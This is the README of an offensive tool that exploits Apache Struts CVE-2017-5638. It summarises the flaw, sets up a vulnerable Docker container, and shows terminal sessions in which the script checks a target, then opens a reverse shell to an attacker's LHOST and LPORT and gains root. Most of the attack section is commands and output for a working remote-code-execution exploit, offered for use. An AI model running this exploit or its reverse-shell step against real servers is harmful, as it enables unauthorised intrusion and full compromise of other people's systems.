# apache_struts_rce

## Summary

An exploit for Apache Struts CVE-2017-5638

The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has
incorrect exception handling and error-message generation during file-upload attempts, which allows
remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or
Content-Length HTTP header, as exploited in the wild in March 2017 with a
Content-Type header containing a #cmd= string.

## Reference

Made so mazen160 struts-pwn old exploit now pops pty shell
https://github.com/mazen160/struts-pwn

## Usage

Start docker container with struts if you want to test this locally

```sh
⬢  apache_struts_rce  master ⦿ docker-compose build
Building struts
Step 1/3 : FROM piesecurity/apache-struts2-cve-2017-5638
 ---> e1440048c3f7
Step 2/3 : EXPOSE 8080
 ---> Using cache
 ---> e952fd534d26
Step 3/3 : RUN set -ex;           apt-get update;      apt-get install -y --no-install-recommends python;      rm -rf /var/lib/apt/lists/*;
 ---> Using cache
 ---> d4de430501d4
Successfully built d4de430501d4
Successfully tagged apachestrutsrce_struts:latest

⬢  apache_struts_rce  master ⦿ docker-compose up -d
Starting apachestrutsrce_struts_1 ... done
```

Verify that container is running.

```sh
⬢  apache_struts_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                    COMMAND             CREATED             STATUS              PORTS                    NAMES
1692c60a2f22        apachestrutsrce_struts   "catalina.sh run"   37 minutes ago      Up 9 seconds        0.0.0.0:8080->8080/tcp   apachestrutsrce_struts_1
```

Run ./apache_struts_rce.py to get the usage menu.

```sh
⬢  apache_struts_rce  master ⦿ ./apache_struts_rce.py

 ▄▄▄·  ▄▄▄· ▄▄▄·  ▄▄·  ▄ .▄▄▄▄ ..▄▄ · ▄▄▄▄▄▄▄▄  ▄• ▄▌▄▄▄▄▄.▄▄ · ▄▄▄   ▄▄· ▄▄▄ .
▐█ ▀█ ▐█ ▄█▐█ ▀█ ▐█ ▌▪██▪▐█▀▄.▀·▐█ ▀. •██  ▀▄ █·█▪██▌•██  ▐█ ▀. ▀▄ █·▐█ ▌▪▀▄.▀·
▄█▀▀█  ██▀·▄█▀▀█ ██ ▄▄██▀▐█▐▀▀▪▄▄▀▀▀█▄ ▐█.▪▐▀▀▄ █▌▐█▌ ▐█.▪▄▀▀▀█▄▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█ ▪▐▌▐█▪·•▐█ ▪▐▌▐███▌██▌▐▀▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█•█▌▐█▄█▌ ▐█▌·▐█▄▪▐█▐█•█▌▐███▌▐█▄▄▌
 ▀  ▀ .▀    ▀  ▀ ·▀▀▀ ▀▀▀ · ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀▀ .▀  ▀·▀▀▀  ▀▀▀
[nighter@nighter.se]

Usage: ./apache_struts_rce.py <URL> <LHOST> <LPORT>

EXAMPLE: ./apache_struts_rce.py 'http://localhost:8080/showcase.action' 10.10.14.24 1337
EXAMPLE: ./apache_struts_rce.py 'http://localhost:8080/showcase.action' check
```        

Check if target is vurnerable

```sh
⬢  apache_struts_rce  master ⦿ ./apache_struts_rce.py 'http://localhost:8080/showcase.action' check
[+] Check: http://localhost:8080/showcase.action
[+] Vulnerable
```

Run the exploit.

```sh
⬢  apache_struts_rce  master ⦿ ./apache_struts_rce.py 'http://localhost:8080/showcase.action' 192.168.1.94 1337
[+] LHOST = 192.168.1.94
[+] LPORT = 1337
[+] Shell listen
[+] Exploit
root@1692c60a2f22:/usr/local/tomcat# whoami
root
```
